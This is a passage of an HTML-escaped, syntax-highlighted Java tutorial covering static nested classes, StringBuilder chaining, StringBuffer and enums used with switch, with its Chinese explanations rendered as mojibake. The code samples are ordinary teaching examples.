&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">StaticNested&lt;/span> &lt;span style="color:#111">sn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">StaticNested&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">NAME&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;OUTER&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">StaticNested&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">NAME&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”¨&lt;code>static&lt;/code>ä¿®é¥°çš„å†…éƒ¨ç±»å’ŒInner Classæœ‰å¾ˆå¤§çš„ä¸åŒï¼Œå®ƒä¸å†ä¾é™„äº&lt;code>Outer&lt;/code>çš„å®ä¾‹ï¼Œè€Œæ˜¯ä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„ç±»ï¼Œå› æ­¤æ— æ³•å¼•ç”¨&lt;code>Outer.this&lt;/code>ï¼Œä½†å®ƒä»ç„¶å¯ä»¥è®¿é—®&lt;code>Outer&lt;/code>çš„&lt;code>private&lt;/code>é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•ï¼›å¦‚æœæŠŠ&lt;code>StaticNested&lt;/code>ç§»åˆ°&lt;code>Outer&lt;/code>ä¹‹å¤–ï¼Œå°±å¤±å»äº†è®¿é—®&lt;code>private&lt;/code>çš„æƒé™&lt;/p>
&lt;h2 id="javaæ ¸å¿ƒç±»éƒ¨åˆ†">Javaæ ¸å¿ƒç±»(éƒ¨åˆ†)&lt;/h2>
&lt;h3 id="stringbuilder">StringBuilder&lt;/h3>
&lt;ul>
&lt;li>æ˜¯ä¸€ä¸ªå¯å˜å¯¹è±¡ï¼Œå¯ä»¥é¢„åˆ†é…ç¼“å†²åŒºï¼Œå‘å…¶ä¸­æ–°å¢å­—ç¬¦æ—¶ï¼Œä¸ä¼šåˆ›å»ºæ–°çš„ä¸´æ—¶å¯¹è±¡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">StringBuilder&lt;/span> &lt;span style="color:#111">sb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">1000&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¯é“¾å¼æ“ä½œ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">sb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Mr &amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insert&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å®ç°çš„å…³é”®æ˜¯å®šä¹‰çš„&lt;code>append()&lt;/code>æ–¹æ³•ä¼šè¿”å›&lt;code>this&lt;/code>ï¼Œè¿™æ ·å°±å¯ä»¥ä¸æ–­è°ƒç”¨è‡ªèº«çš„å…¶ä»–æ–¹æ³•ï¼›ä»¿å†™é“¾å¼è°ƒç”¨å‡½æ•°&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#111">adder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Adder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">adder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">3&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">inc&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">10&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">adder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Adder&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#75af00">inc&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">++;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">sum&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>StringBuffer&lt;/code>å’Œ&lt;code>StringBuilder&lt;/code>æ¥å£å®Œå…¨ç›¸åŒï¼Œæ˜¯æ—©æœŸç‰ˆæœ¬ï¼Œé€šè¿‡åŒæ­¥æ¥ä¿è¯å¤šä¸ªçº¿ç¨‹æ“ä½œ&lt;code>StringBuffer&lt;/code>ä¹Ÿæ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯åŒæ­¥ä¼šå¸¦æ¥æ‰§è¡Œé€Ÿåº¦çš„ä¸‹é™&lt;/li>
&lt;/ul>
&lt;h3 id="enum">enum&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SAT&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Work at home!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Work at office!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">enum&lt;/span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// åªéœ€ä¾æ¬¡åˆ—å‡ºæšä¸¾çš„å¸¸é‡å
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;code>enum&lt;/code>å¸¸é‡æœ¬èº«å¸¦æœ‰ç±»å‹ä¿¡æ¯ï¼Œå³&lt;code>Weekday.SUN&lt;/code>ç±»å‹æ˜¯&lt;code>Weekday&lt;/code>ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ£€æŸ¥å‡ºç±»å‹é”™è¯¯&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸å¯èƒ½å¼•ç”¨åˆ°éæšä¸¾çš„å€¼ï¼Œå› ä¸ºæ— æ³•é€šè¿‡ç¼–è¯‘&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸åŒç±»å‹çš„æšä¸¾ä¸èƒ½äº’ç›¸æ¯”è¾ƒæˆ–è€…èµ‹å€¼ï¼Œå› ä¸ºç±»å‹ä¸ç¬¦&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>enum&lt;/code>è™½ç„¶ä¹Ÿæ˜¯å¼•ç”¨ç±»å‹ï¼Œä½†å› ä¸ºå…¶åœ¨JVMä¸­åªæœ‰å”¯ä¸€å®ä¾‹ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨&lt;code>==&lt;/code>æ¯”è¾ƒ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç»§æ‰¿è‡ª&lt;code>java.lang.Enum&lt;/code>ï¼Œæ— æ³•è¢«ç»§æ‰¿ï¼Œæ— æ³•newå®ä¾‹&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æšä¸¾ç±»çš„å­—æ®µä¹Ÿå¯ä»¥æ˜¯éfinalç±»å‹ï¼Œå³å¯ä»¥åœ¨è¿è¡ŒæœŸä¿®æ”¹ï¼Œä½†æ˜¯ä¸æ¨èè¿™æ ·&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¤©ç”Ÿé€‚åˆswitchï¼Œå…·æœ‰ç±»å‹ä¿¡æ¯å’Œæœ‰é™ä¸ªæšä¸¾å¸¸é‡&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">switch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">day&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Today is &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;. Work at office!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
